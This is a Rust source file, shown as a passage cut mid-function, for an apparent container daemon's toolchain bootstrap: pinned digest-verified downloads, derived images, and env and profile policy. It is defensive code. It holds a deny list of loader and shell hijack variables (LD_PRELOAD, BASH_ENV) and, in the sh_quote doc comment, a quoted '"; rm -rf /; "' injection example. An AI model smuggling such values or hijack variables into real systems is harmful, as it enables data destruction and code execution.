//! Blueprint bootstrap (SPEC §4 base environment, §5 blueprints; ADR-0012,
//! ADR-0013, ADR-0014) — Sprint 02 step 04.
//!
//! [`Bootstrapper::bootstrap_home`] materializes a blueprint's `[tools]` into
//! a parcel home BEFORE the first agent session, in three layers:
//!
//! 1. **Image layer** ([`Bootstrapper::ensure_image`], ADR-0012 cl. 2): the
//!    blueprint's `[meta].base_image` is the PARENT. `kind = "apk"` tools plus
//!    the daemon's [`BOOTSTRAP_FLOOR`] are `apk add`ed into a derived local
//!    image `localhost/hamlet/<name>:v<version>-f<floor>-c<fingerprint>`,
//!    built at most once per (blueprint version, floor version, Containerfile
//!    fingerprint). The derived image has **no ENTRYPOINT/CMD** — the daemon
//!    supplies the slim keep-alive ([`crate::podman::KEEP_ALIVE_COMMAND`],
//!    SPEC §4: no systemd-class init). apk tools cannot be installed at
//!    bootstrap time: containers run `--user <uid>` with `--cap-drop=ALL` and
//!    `no-new-privileges`, i.e. never root, so `/usr` is not writable.
//! 2. **Home layer** (user space, SPEC §4 "agents self-install version-locked
//!    toolchains inside `/home/<uid>/`"): Pixi, NVM+Node and Rustup+Rust are
//!    installed under the parcel home from pinned, digest-verified artifacts.
//! 3. **Env layer**: the derived per-UID structural vars plus the blueprint's
//!    non-secret `[env]` defaults are written to `$HOME/.profile`. Secrets
//!    from `.env` are injected at session start (Sprint 03) and are NEVER
//!    written into a home — asserted by `tests::profile_never_carries_secrets`
//!    and by the guarded suite.
//!
//! # pkgcache is a mirror, not a trust anchor (ADR-0013)
//!
//! `market/pkgcache/` is mode 01777 (ADR-0011): any agent UID can create or
//! replace files there. So every artifact follows the same pipeline —
//! **stage privately → verify sha256 against [`ToolchainPins`] → use the
//! private copy**:
//!
//! - cache HIT: `cp /var/pkgcache/dist/<f> <home>/.hamlet/stage/<f>`
//! - cache MISS: `curl -fsSL --retry 3 -o <home>/.hamlet/stage/<f> <url>`
//! - then `sha256sum <staged>` and compare to the pin — a mismatch aborts the
//!   bootstrap before anything is extracted, executed, or published;
//! - then publish with `ln <staged> /var/pkgcache/dist/<f>` (best effort). A
//!   hard link, not a copy: `ln` fails instead of following a destination
//!   symlink planted by another UID, and it publishes exactly the inode whose
//!   digest was just verified.
//!
//! Extraction therefore never touches shared bytes, and a poisoned cache entry
//! costs a re-download, never a compromise. Digests come from the reviewed
//! source tree (`defaults/toolchain-pins.toml`), so re-provisioning is both
//! offline-friendly (cache hits, zero downloads) and verifiable.
//!
//! # Idempotence
//!
//! The plan's desired state is a pure function of `(uid, blueprint, pins,
//! floor)`: a canonical JSON manifest and the exact `.profile` bytes.
//! Bootstrap re-reads both from the home and, if they match byte-for-byte and
//! every tool probe still answers, reports [`BootstrapReport::no_op`] without
//! a single install step or download. The manifest's sha256 is recorded in the
//! parcel's `DEED.md` under `### Dynamic Alterations` as the baseline entry
//! ([`deed_baseline_entry`]) — once per digest, so re-running is a no-op there
//! too (SPEC §9.4: that block is the promotion source Sprint 06 parses).
//!
//! # Purity seam
//!
//! Everything that decides *what* to do is pure and golden-tested
//! ([`plan_bootstrap`], [`containerfile`], [`derived_image_tag`],
//! [`parcel_env`], [`profile`], [`manifest`], [`deed_baseline_entry`]): the
//! caller injects the observed pkgcache state and gets a plan back. Only
//! [`Bootstrapper`] touches the filesystem or podman, and it does so through
//! the [`Runtime`] seam ([`crate::podman::FakeRuntime`] in tests).
//!
//! # Escape surface this module adds (QA: extend, don't duplicate)
//!
//! - `podman build` from a daemon-private 0700 temp dir — never from a path
//!   agent UIDs can write (a writable Containerfile IS the root filesystem).
//! - Every in-container argv is built here, never a shell: no `sh -c`, and
//!   the inner command is validated so it can't become an `env` option.
//! - Every written path is inside `/home/<uid>/` or `/var/pkgcache/dist/`;
//!   `/var/git/`, `/var/context/`, `/usr`, `/etc` are never touched
//!   (`tests::no_step_writes_outside_home_or_mirror`).
//! - Blueprint `[env]` cannot set structural keys, loader keys (`LD_PRELOAD`
//!   …), or point an executable prefix into a shared mount.
//! - Profile values are single-quoted, so a hostile blueprint value can't
//!   inject shell into every later session ([`sh_quote`]).

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use hamlet_core::blueprint::{Blueprint, ToolKind};
use hamlet_core::mount::MountSpec;
use hamlet_core::pins::{ArtifactFormat, PinError, ToolPin, ToolchainPins};
use hamlet_core::sanitize::SafeName;
use hamlet_core::slots::{FIRST_AGENT_UID, LAST_AGENT_UID};
use hamlet_core::tree::HamletTree;
use serde_json::{Map, Value};

use crate::hostperm::{set_mode, HostPermError, MODE_PKGCACHE_DIST};
use crate::podman::{home_container_dir, PodmanError, Runtime};

// ---------------------------------------------------------------------------
// Constants (image policy + home layout)
// ---------------------------------------------------------------------------

/// Version of the daemon-owned apk floor; part of the derived image tag, so
/// changing the floor rebuilds every blueprint image (ADR-0012 cl. 2).
///
/// **v2** (ADR-0024): added `libgcc` + `libstdc++` — the shared libraries the
/// pinned musl toolchain artifacts dynamically link against (QA04-05). Floor
/// v1 images provably could not execute node inside a parcel.
pub const FLOOR_VERSION: u32 = 2;

/// apk packages bootstrap itself needs, unioned with the blueprint's
/// `kind = "apk"` tools into the derived image. GNU `tar` (not busybox) is
/// deliberate: it strips absolute member paths and refuses `..` members, so
/// extracting a pinned archive can't write outside the destination.
///
/// `libgcc`/`libstdc++` are **not** agent-facing toolchain choices: they are the
/// C++/GCC runtime that the pinned `nvm` artifact's musl-linked `node` binary
/// has in its `NEEDED` list (verified: `libstdc++.so.6`, `libgcc_s.so.1`).
/// Alpine ships neither in the base image, so without them every parcel's node
/// probe dies at the dynamic loader with exit 127 (QA04-05). They live in the
/// floor rather than in a blueprint because the requirement comes from the
/// daemon's *pin table*, not from any promotable village policy.
pub const BOOTSTRAP_FLOOR: [&str; 7] = [
    "ca-certificates",
    "curl",
    "gzip",
    "libgcc",
    "libstdc++",
    "tar",
    "xz",
];

/// Derived images are local-only: the `localhost/` prefix means podman never
/// resolves them against a registry (they are built here, never pulled).
pub const DERIVED_IMAGE_PREFIX: &str = "localhost/hamlet";

/// Schema of `$HOME/.hamlet/toolchain.json`.
pub const MANIFEST_SCHEMA_VERSION: u32 = 1;

/// Parcel-local bootstrap directory (staging + manifest), inside the home.
const HAMLET_DIR: &str = ".hamlet";
/// Private artifact staging directory: `$HOME/.hamlet/stage`.
const STAGE_DIR: &str = "stage";
/// Manifest file name: `$HOME/.hamlet/toolchain.json`.
const MANIFEST_FILE: &str = "toolchain.json";
/// POSIX login profile: busybox ash reads `~/.profile` for `sh -l`.
const PROFILE_FILE: &str = ".profile";
/// Digest tool used inside the container (image floor provides coreutils).
const DIGEST_TOOL: &str = "sha256sum";
/// Alpine's default `PATH`; appended to the tool dirs so bootstrap execs and
/// login shells resolve `tar`/`curl`/`mkdir` without depending on the
/// container env (ADR-0012 cl. 3).
pub const IMAGE_DEFAULT_PATH: &str = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";

/// DEED.md block the baseline entry is appended to (SPEC §9.4 parse target).
pub const DEED_ALTERATIONS_HEADING: &str = "### Dynamic Alterations";
/// Marker on the baseline entry's first line — Sprint 06 must treat a
/// `baseline · toolchain bootstrap` entry as the *environment floor*, not as
/// an agent-authored alteration to promote.
pub const DEED_BASELINE_MARKER: &str = "baseline · toolchain bootstrap";

/// Env keys bootstrap derives per UID. A blueprint that declares one is
/// refused (ADR-0014 cl. 2): these are structural, not policy.
pub const STRUCTURAL_ENV_KEYS: [&str; 9] = [
    "CARGO_HOME",
    "HAMLET_BLUEPRINT",
    "HAMLET_BLUEPRINT_VERSION",
    "HAMLET_TOOLCHAIN_MANIFEST",
    "HOME",
    "NVM_DIR",
    "PATH",
    "PIXI_HOME",
    "RUSTUP_HOME",
];

/// Env keys that let a blueprint hijack the dynamic loader or the shell.
/// Never accepted from a blueprint — a promoted DEED entry would otherwise
/// become code execution in every later session of that parcel.
pub const FORBIDDEN_ENV_KEYS: [&str; 6] = [
    "BASH_ENV",
    "ENV",
    "IFS",
    "LD_AUDIT",
    "LD_LIBRARY_PATH",
    "LD_PRELOAD",
];

/// Env keys whose value MAY point into `/var/pkgcache/` (cache semantics,
/// SPEC §4 rw cache mount). Everything else pointing into a shared mount is
/// refused: a shared *executable* prefix on a 01777 mount would let any agent
/// UID plant binaries that every other parcel later runs.
pub const CACHE_ENV_KEYS: [&str; 3] = ["NPM_CONFIG_CACHE", "PIP_CACHE_DIR", "PIXI_CACHE_DIR"];

/// Artifact `role`s each tool kind installs, in order.
const ROLE_PIXI_PRIMARY: &str = "primary";
const ROLE_NVM_MANAGER: &str = "manager";
const ROLE_NVM_RUNTIME: &str = "runtime";
const ROLE_RUST_RUSTUP: &str = "rustup";
const ROLE_RUST_RUSTC: &str = "rustc";
const ROLE_RUST_CARGO: &str = "cargo";
const ROLE_RUST_STD: &str = "rust-std";

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Bootstrap failure. Every variant names the step, and nothing is left
/// half-installed without the caller's rollback seeing it (provisioning
/// unwinds the container and the parcel — [`crate::census`]).
#[derive(Debug)]
pub enum BootstrapError {
    /// Host filesystem failure with the step that failed.
    Io {
        /// What was attempted.
        context: String,
        /// Underlying failure.
        source: std::io::Error,
    },
    /// Host permission model failure ([`crate::hostperm`]).
    HostPerm(HostPermError),
    /// Podman invocation failure (argv + stderr verbatim, ADR-0010 cl. 5).
    Podman(PodmanError),
    /// Pin-table parse failure.
    Pins(PinError),
    /// A blueprint tool has no pin: refused, never guessed at (ADR-0012 cl. 4).
    UnpinnedTool {
        /// Tool channel.
        kind: ToolKind,
        /// Tool name.
        name: String,
        /// Declared version spec.
        version_spec: Option<String>,
    },
    /// A pin's artifact is built for another architecture.
    ArchMismatch {
        /// Artifact file name.
        file: String,
        /// Pinned arch.
        pin_arch: String,
        /// Daemon's `std::env::consts::ARCH`.
        host_arch: String,
    },
    /// A pin declares an artifact role this installer doesn't know.
    UnknownArtifactRole {
        /// Tool channel.
        kind: ToolKind,
        /// The role found.
        role: String,
    },
    /// An artifact's pinned format isn't what the installer for that role
    /// requires (e.g. `rustup` must be a raw binary, not an archive).
    UnexpectedArtifactFormat {
        /// Artifact file name.
        file: String,
        /// Format the installer needs.
        expected: ArtifactFormat,
        /// Format the pin declares.
        actual: ArtifactFormat,
    },
    /// A pin is missing a required artifact role.
    MissingArtifactRole {
        /// Tool channel.
        kind: ToolKind,
        /// The role required.
        role: String,
    },
    /// A blueprint `[env]` key is structural or loader-hijacking.
    ForbiddenEnvKey {
        /// The offending key.
        key: String,
        /// Why it is refused.
        reason: &'static str,
    },
    /// An env value points into a shared mount without cache semantics.
    SharedMountEnvValue {
        /// The offending key.
        key: String,
        /// The offending value.
        value: String,
        /// The shared mount root it points into.
        mount: String,
    },
    /// A staged artifact's digest does not match its pin: the bytes are
    /// attacker-controlled until proven otherwise (ADR-0013 cl. 2). Nothing
    /// is extracted, executed, or published.
    DigestMismatch {
        /// Artifact file name.
        file: String,
        /// Pinned digest.
        expected: String,
        /// Digest actually computed in-container.
        actual: String,
    },
    /// `sha256sum` output was not a usable digest line.
    BadDigestOutput {
        /// Artifact/file the digest was requested for.
        file: String,
        /// Exit code.
        code: i32,
        /// Raw stdout.
        stdout: String,
        /// Raw stderr.
        stderr: String,
    },
    /// An in-container step exited non-zero.
    StepFailed {
        /// Human-readable step label.
        label: String,
        /// The in-container argv (env prefix included).
        argv: Vec<String>,
        /// Exit code.
        code: i32,
        /// In-container stderr.
        stderr: String,
    },
    /// A tool probe (`--version`) failed after install: the home is not
    /// usable, so no manifest and no DEED baseline are recorded.
    ProbeFailed {
        /// Tool name.
        tool: String,
        /// Probe argv.
        argv: Vec<String>,
        /// Exit code.
        code: i32,
        /// In-container stderr.
        stderr: String,
    },
    /// The parcel's DEED.md has no `### Dynamic Alterations` block to record
    /// the baseline in — provisioning wrote it, so this means the parcel was
    /// tampered with or bootstrap ran out of order.
    DeedMalformed {
        /// DEED.md path.
        path: PathBuf,
    },
    /// A parcel doc that must be a regular file is something else
    /// (ADR-0007: never follow, never adopt).
    NotRegularFile {
        /// The offending path.
        path: PathBuf,
    },
    /// The UID is not a subagent slot: only parcels get bootstrapped homes
    /// (the Mayor's manor home is a different flow, Sprint 05).
    UidPolicy {
        /// The rejected uid.
        uid: u32,
    },
}

impl fmt::Display for BootstrapError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Io { context, source } => write!(f, "bootstrap: {context}: {source}"),
            Self::HostPerm(e) => write!(f, "bootstrap: {e}"),
            Self::Podman(e) => write!(f, "bootstrap: {e}"),
            Self::Pins(e) => write!(f, "bootstrap: pins: {e}"),
            Self::UnpinnedTool {
                kind,
                name,
                version_spec,
            } => write!(
                f,
                "bootstrap: no toolchain pin for {kind}/{name} version_spec {:?} — add one to \
                 defaults/toolchain-pins.toml (ADR-0012 cl. 4: unpinned tools are refused, \
                 never guessed at)",
                version_spec.as_deref().unwrap_or("")
            ),
            Self::ArchMismatch {
                file,
                pin_arch,
                host_arch,
            } => write!(
                f,
                "bootstrap: artifact {file} is pinned for {pin_arch} but this daemon runs on {host_arch}"
            ),
            Self::UnknownArtifactRole { kind, role } => {
                write!(f, "bootstrap: {kind} installer has no handler for artifact role {role:?}")
            }
            Self::UnexpectedArtifactFormat {
                file,
                expected,
                actual,
            } => write!(
                f,
                "bootstrap: artifact {file} is pinned as {actual} but its installer requires {expected}"
            ),
            Self::MissingArtifactRole { kind, role } => {
                write!(f, "bootstrap: {kind} pin is missing the required {role:?} artifact")
            }
            Self::ForbiddenEnvKey { key, reason } => {
                write!(f, "bootstrap: blueprint [env] {key} is refused: {reason}")
            }
            Self::SharedMountEnvValue { key, value, mount } => write!(
                f,
                "bootstrap: blueprint [env] {key} = {value:?} points into the shared mount {mount}/ \
                 (only {:?} may, and only into /var/pkgcache/) — a shared executable prefix would let \
                 any UID plant binaries every other parcel runs",
                CACHE_ENV_KEYS
            ),
            Self::DigestMismatch {
                file,
                expected,
                actual,
            } => write!(
                f,
                "bootstrap: digest mismatch for {file}: pinned {expected}, got {actual} — \
                 refusing to use it (ADR-0013: the pkgcache is world-writable)"
            ),
            Self::BadDigestOutput {
                file,
                code,
                stdout,
                stderr,
            } => write!(
                f,
                "bootstrap: {DIGEST_TOOL} for {file} produced no digest (exit {code}); stdout={stdout:?} stderr={stderr:?}"
            ),
            Self::StepFailed {
                label,
                argv,
                code,
                stderr,
            } => write!(
                f,
                "bootstrap: step {label:?} failed (exit {code}): argv={argv:?} stderr={stderr:?}"
            ),
            Self::ProbeFailed {
                tool,
                argv,
                code,
                stderr,
            } => write!(
                f,
                "bootstrap: {tool} probe failed (exit {code}): argv={argv:?} stderr={stderr:?}"
            ),
            Self::DeedMalformed { path } => write!(
                f,
                "bootstrap: {} has no '{DEED_ALTERATIONS_HEADING}' block (SPEC §9.4)",
                path.display()
            ),
            Self::NotRegularFile { path } => write!(
                f,
                "bootstrap: {} must be a regular file; refusing to follow or adopt (ADR-0007)",
                path.display()
            ),
            Self::UidPolicy { uid } => write!(
                f,
                "bootstrap: uid {uid} is not a subagent slot ({FIRST_AGENT_UID}..={LAST_AGENT_UID})"
            ),
        }
    }
}

impl std::error::Error for BootstrapError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            Self::HostPerm(e) => Some(e),
            Self::Podman(e) => Some(e),
            Self::Pins(e) => Some(e),
            _ => None,
        }
    }
}

impl From<PodmanError> for BootstrapError {
    fn from(e: PodmanError) -> Self {
        Self::Podman(e)
    }
}

impl From<PinError> for BootstrapError {
    fn from(e: PinError) -> Self {
        Self::Pins(e)
    }
}

impl From<HostPermError> for BootstrapError {
    fn from(e: HostPermError) -> Self {
        Self::HostPerm(e)
    }
}

fn io_err(context: &str) -> impl FnOnce(std::io::Error) -> BootstrapError + '_ {
    move |source| BootstrapError::Io {
        context: context.to_owned(),
        source,
    }
}

// ---------------------------------------------------------------------------
// In-container paths (all derived from the SPEC §4 mount table)
// ---------------------------------------------------------------------------

/// `/var/pkgcache` — the shared mirror mount (SPEC §4).
#[must_use]
pub fn pkgcache_dir() -> String {
    MountSpec::PkgCache
        .container_path()
        .trim_end_matches('/')
        .to_owned()
}

/// `/var/pkgcache/dist` — pinned-artifact mirror directory.
#[must_use]
pub fn mirror_dir() -> String {
    format!("{}/dist", pkgcache_dir())
}

/// `/home/<uid>/.hamlet` — parcel-local bootstrap directory.
#[must_use]
pub fn hamlet_home_dir(uid: u32) -> String {
    format!("{}/{HAMLET_DIR}", home_container_dir(uid))
}

/// `/home/<uid>/.hamlet/stage` — private artifact staging (0700).
#[must_use]
pub fn stage_dir(uid: u32) -> String {
    format!("{}/{STAGE_DIR}", hamlet_home_dir(uid))
}

/// `/home/<uid>/.hamlet/toolchain.json` — the installed-state manifest.
#[must_use]
pub fn manifest_path(uid: u32) -> String {
    format!("{}/{MANIFEST_FILE}", hamlet_home_dir(uid))
}

/// `/home/<uid>/.profile` — POSIX login profile (env layer).
#[must_use]
pub fn profile_path(uid: u32) -> String {
    format!("{}/{PROFILE_FILE}", home_container_dir(uid))
}

/// Staged (private) copy of one mirror artifact.
#[must_use]
pub fn staged_path(uid: u32, file: &str) -> String {
    format!("{}/{file}", stage_dir(uid))
}

/// Mirror (shared, untrusted) copy of one artifact.
#[must_use]
pub fn mirror_path(file: &str) -> String {
    format!("{}/{file}", mirror_dir())
}

// ---------------------------------------------------------------------------
// Image policy (ADR-0012 cl. 1–2)
// ---------------------------------------------------------------------------

/// FNV-1a 64-bit: a deterministic, dependency-free fingerprint of the
/// generated Containerfile, carried in the derived image tag so a changed
/// image definition can never be served from a stale tag. Not a security
/// primitive — the security anchors are the artifact digest pins.
#[must_use]
pub fn fnv1a64(bytes: &[u8]) -> u64 {
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for byte in bytes {
        hash ^= u64::from(*byte);
        hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
    }
    hash
}

/// Sorted union of the blueprint's `kind = "apk"` tools and
/// [`BOOTSTRAP_FLOOR`] — the derived image's package set.
#[must_use]
pub fn apk_packages(blueprint: &Blueprint) -> Vec<String> {
    let mut set: BTreeSet<String> = BOOTSTRAP_FLOOR.iter().map(|p| (*p).to_owned()).collect();
    for tool in blueprint.tools() {
        if tool.kind() == ToolKind::Apk {
            set.insert(tool.name().to_owned());
        }
    }
    set.into_iter().collect()
}

/// The generated Containerfile for a blueprint — pure, deterministic, and the
/// input to the image tag fingerprint. The derived image declares **no**
/// ENTRYPOINT/CMD: the daemon controls the keep-alive body (SPEC §4).
///
/// "Declares no CMD" is enforced by *explicitly clearing* both, not by omission
/// (ADR-0024, QA04-06): `[meta].base_image` is parent-supplied, and
/// `alpine:3.24` upstream ships `CMD ["/bin/sh"]`. Omitting the instruction
/// inherits the parent's body, so an upstream base could silently hand a parcel
/// an interactive shell the daemon never asked for. `ENTRYPOINT []` / `CMD []`
/// reset both to empty for *any* parent, which is the fail-closed direction:
/// a run that somehow reached the image with no daemon-supplied command errors
/// out instead of starting a root shell. Every daemon `run` argv appends an
/// explicit non-empty command (`KEEP_ALIVE_COMMAND`, refused if empty by
/// `validate_cmd`), so the keep-alive remains the only possible body.
#[must_use]
pub fn containerfile(blueprint: &Blueprint) -> String {
    let meta = blueprint.meta();
    format!(
        "# hamlet derived parcel image — GENERATED by hamlet-daemon bootstrap.\n\
         # blueprint: {name} v{version} · parent: {parent} · apk floor: v{floor}\n\
         # Rebuilt only when this file's fingerprint leaves the tag (ADR-0012 cl. 2).\n\
         # No init system: the daemon supplies the slim keep-alive at run\n\
         # (SPEC §4 — no systemd-class init).\n\
         # ENTRYPOINT/CMD are explicitly CLEARED, not merely omitted (ADR-0024):\n\
         # the parent image may declare a body (alpine:3.24 ships CMD [\"/bin/sh\"]),\n\
         # and an inherited one would silently become a parcel's process.\n\
         FROM {parent}\n\
         RUN apk add --no-cache {pkgs}\n\
         ENTRYPOINT []\n\
         CMD []\n",
        name = meta.name(),
        version = meta.version(),
        parent = meta.base_image(),
        floor = FLOOR_VERSION,
        pkgs = apk_packages(blueprint).join(" "),
    )
}

/// The derived image reference for a blueprint:
/// `localhost/hamlet/<name>:v<version>-f<floor>-c<fingerprint>`.
///
/// # Errors
///
/// [`BootstrapError::Io`] is never returned here; an invalid repository name
/// (a blueprint name that isn't a valid lowercase image path component) is
/// refused by [`crate::podman::build_argv`]'s image validation, so this is
/// infallible in practice and typed for symmetry.
#[must_use]
pub fn derived_image_tag(blueprint: &Blueprint) -> String {
    let meta = blueprint.meta();
    let fingerprint = fnv1a64(containerfile(blueprint).as_bytes());
    format!(
        "{DERIVED_IMAGE_PREFIX}/{name}:v{version}-f{floor}-c{fingerprint:016x}",
        name = meta.name().as_str().to_ascii_lowercase(),
        version = meta.version(),
        floor = FLOOR_VERSION,
    )
}

/// Daemon-private build context: `std::env::temp_dir()/hamlet-build-<name>-<root fingerprint>`.
///
/// NEVER a path inside the village tree — `market/pkgcache/` is 01777, and a
/// Containerfile any agent UID can rewrite is arbitrary code as the container's
/// root filesystem. The per-village fingerprint keeps two daemons on one host
/// from sharing a context directory.
#[must_use]
pub fn build_context_dir(tree: &HamletTree, blueprint: &Blueprint) -> PathBuf {
    let root_fp = fnv1a64(tree.root().to_string_lossy().as_bytes());
    std::env::temp_dir().join(format!(
        "hamlet-build-{}-{root_fp:016x}",
        blueprint.meta().name().as_str().to_ascii_lowercase()
    ))
}

// ---------------------------------------------------------------------------
// Env policy (ADR-0014)
// ---------------------------------------------------------------------------

/// The shared mounts no env value may point into (except
/// [`CACHE_ENV_KEYS`] into `/var/pkgcache/`).
#[must_use]
pub fn shared_mount_roots() -> Vec<String> {
    [
        MountSpec::Mail,
        MountSpec::Freight,
        MountSpec::CommissionGit { commission: 0 },
        MountSpec::PkgCache,
        MountSpec::Context,
    ]
    .iter()
    .map(|spec| spec.container_path().trim_end_matches('/').to_owned())
    .collect()
}

/// The parcel's session environment: bootstrap-derived per-UID structural vars
/// plus the blueprint's non-secret `[env]` passthrough.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParcelEnv {
    /// Derived per-UID vars. These (and only these) prefix every bootstrap
    /// exec, and they are what `$HOME/.profile` exports.
    pub structural: BTreeMap<String, String>,
    /// Blueprint `[env]` passthrough (already in the container env via
    /// `podman run -e`; repeated in the profile for login shells).
    pub passthrough: BTreeMap<String, String>,
}

impl ParcelEnv {
    /// Merged, sorted view (structural wins — it is derived, not declared).
    #[must_use]
    pub fn all(&self) -> BTreeMap<String, String> {
        let mut all = self.passthrough.clone();
        all.extend(self.structural.clone());
        all
    }

    /// Every key, sorted — the only env data ever recorded in DEED.md or the
    /// manifest (SPEC §11.4: values stay out of lineage documents).
    #[must_use]
    pub fn keys(&self) -> Vec<String> {
        self.all().into_keys().collect()
    }
}

/// Derive the parcel environment for `uid`.
///
/// `tool_dirs` are the per-tool bin directories to prepend to `PATH`, in
/// blueprint order; `tool_env` are the per-tool structural vars (e.g.
/// `CARGO_HOME`), also in blueprint order.
///
/// # Errors
///
/// [`BootstrapError::ForbiddenEnvKey`] when the blueprint declares a
/// structural or loader-hijacking key; [`BootstrapError::SharedMountEnvValue`]
/// when a value points into a shared mount without cache semantics.
pub fn parcel_env(
    uid: u32,
    blueprint: &Blueprint,
    tool_dirs: &[String],
    tool_env: &BTreeMap<String, String>,
) -> Result<ParcelEnv, BootstrapError> {
    if !(FIRST_AGENT_UID..=LAST_AGENT_UID).contains(&uid) {
        return Err(BootstrapError::UidPolicy { uid });
    }
    let mut structural = tool_env.clone();
    structural.insert("HOME".to_owned(), home_container_dir(uid));
    structural.insert(
        "HAMLET_BLUEPRINT".to_owned(),
        blueprint.meta().name().to_string(),
    );
    structural.insert(
        "HAMLET_BLUEPRINT_VERSION".to_owned(),
        blueprint.meta().version().to_string(),
    );
    structural.insert("HAMLET_TOOLCHAIN_MANIFEST".to_owned(), manifest_path(uid));
    let mut path: Vec<String> = tool_dirs.to_vec();
    path.push(IMAGE_DEFAULT_PATH.to_owned());
    structural.insert("PATH".to_owned(), path.join(":"));

    let mut passthrough = BTreeMap::new();
    for (key, value) in blueprint.env() {
        if STRUCTURAL_ENV_KEYS.contains(&key.as_str()) {
            return Err(BootstrapError::ForbiddenEnvKey {
                key: key.clone(),
                reason: "bootstrap-derived per-UID structural var (ADR-0014 cl. 2)",
            });
        }
        if FORBIDDEN_ENV_KEYS.contains(&key.as_str()) {
            return Err(BootstrapError::ForbiddenEnvKey {
                key: key.clone(),
                reason: "dynamic-loader/shell hijack vector — never settable from a blueprint",
            });
        }
        check_shared_mount_value(key, value)?;
        passthrough.insert(key.clone(), value.clone());
    }
    // Self-audit: derived values must satisfy the same rule they enforce.
    for (key, value) in &structural {
        check_shared_mount_value(key, value)?;
    }
    Ok(ParcelEnv {
        structural,
        passthrough,
    })
}

fn check_shared_mount_value(key: &str, value: &str) -> Result<(), BootstrapError> {
    for mount in shared_mount_roots() {
        let inside = value == mount || value.starts_with(&format!("{mount}/"));
        if !inside {
            continue;
        }
        let cache_ok = CACHE_ENV_KEYS.contains(&key) && mount == pkgcache_dir();
        if !cache_ok {
            return Err(BootstrapError::SharedMountEnvValue {
                key: key.to_owned(),
                value: value.to_owned(),
                mount,
            });
        }
    }
    Ok(())
}

/// POSIX-safe single quoting: everything inside `'…'` is inert, and an
/// embedded `'` becomes `'\''`. A blueprint `[env]` value is validated for
/// control characters only, so quoting is what stops `"; rm -rf /; "` or
/// `$(…)` from becoming shell in every later login session.
#[must_use]
pub fn sh_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

// ---------------------------------------------------------------------------
// Plan: resolved tools, steps, profile, manifest, DEED entry
// ---------------------------------------------------------------------------

/// One pinned artifact as the plan will use it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ArtifactUse {
    /// Artifact file name (mirror + staging basename).
    pub file: String,
    /// Artifact role within its tool (`manager`, `rustc`, …).
    pub role: String,
    /// Concrete artifact version.
    pub version: String,
    /// Pinned sha256 the staged copy must match.
    pub sha256: String,
    /// Upstream URL (used only on a cache miss).
    pub url: String,
    /// Packaging (extraction argv selector).
    pub format: ArtifactFormat,
    /// `true` = the mirror already holds it → zero downloads (instrumentation).
    pub cached: bool,
}

/// One blueprint tool resolved through the pin table, with its install steps.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedTool {
    /// Tool channel.
    pub kind: ToolKind,
    /// Blueprint tool name.
    pub name: String,
    /// Blueprint version spec (as declared).
    pub version_spec: Option<String>,
    /// Pinned concrete version.
    pub version: String,
    /// Artifacts in install order.
    pub artifacts: Vec<ArtifactUse>,
    /// Per-tool structural env (`CARGO_HOME`, `NVM_DIR`, …).
    pub env: BTreeMap<String, String>,
    /// Bin directory prepended to `PATH`.
    pub bin_dir: String,
    /// Probe argv proving the tool works (`--version`).
    pub probe: Vec<String>,
}

/// One in-container action. Every variant renders to argv via
/// [`BootstrapStep::argv`]; nothing here is a shell.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BootstrapStep {
    /// `mkdir -p <paths…>`
    Mkdir {
        /// Directories to create.
        paths: Vec<String>,
    },
    /// `chmod <mode> <path>` (used for a raw-binary artifact).
    Chmod {
        /// Target path.
        path: String,
        /// Octal mode without a leading zero (`0700`).
        mode: String,
    },
    /// `cp <from> <to>` — mirror (untrusted) → private stage.
    StageFromCache {
        /// Artifact file name.
        file: String,
        /// Mirror path.
        from: String,
        /// Staged path.
        to: String,
    },
    /// `curl -fsSL --retry 3 -o <to> <url>` — the only network step.
    Download {
        /// Artifact file name.
        file: String,
        /// Pinned upstream URL.
        url: String,
        /// Staged path.
        to: String,
    },
    /// `sha256sum <path>`, compared against the pin by the executor.
    Verify {
        /// Artifact file name.
        file: String,
        /// Staged path to digest.
        path: String,
        /// Pinned digest.
        expect_sha256: String,
    },
    /// `ln <from> <to>` — publish the verified inode into the mirror
    /// (best effort: `ln` refuses an existing name instead of following it).
    Publish {
        /// Artifact file name.
        file: String,
        /// Staged path.
        from: String,
        /// Mirror path.
        to: String,
    },
    /// `tar -x <-z|-J> -f <archive> -C <dest> [--strip-components <n>]`
    Extract {
        /// Artifact file name.
        file: String,
        /// Staged archive path.
        archive: String,
        /// Extraction destination (always inside the home).
        dest: String,
        /// Leading path components to strip.
        strip: u32,
        /// Archive format.
        format: ArtifactFormat,
    },
    /// One arbitrary in-container argv (installer, `rustup`, staging cleanup).
    Exec {
        /// Human-readable label (report + errors).
        label: String,
        /// In-container argv (before the env prefix).
        argv: Vec<String>,
    },
    /// `<tool> --version`: must exit 0, stdout recorded in the report.
    Probe {
        /// Tool name.
        tool: String,
        /// Probe argv.
        argv: Vec<String>,
    },
    /// `tee <path>` with the content piped on stdin (the home is 0700
    /// subuid-owned, so the daemon can only write it from inside).
    Write {
        /// Destination path inside the home.
        path: String,
        /// Exact bytes to write.
        content: String,
    },
}

impl BootstrapStep {
    /// Human-readable label for reports and errors.
    #[must_use]
    pub fn label(&self) -> String {
        match self {
            Self::Mkdir { paths } => format!("mkdir {}", paths.join(" ")),
            Self::Chmod { path, mode } => format!("chmod {mode} {path}"),
            Self::StageFromCache { file, .. } => format!("stage {file} (pkgcache hit)"),
            Self::Download { file, .. } => format!("download {file}"),
            Self::Verify { file, .. } => format!("verify {file}"),
            Self::Publish { file, .. } => format!("publish {file}"),
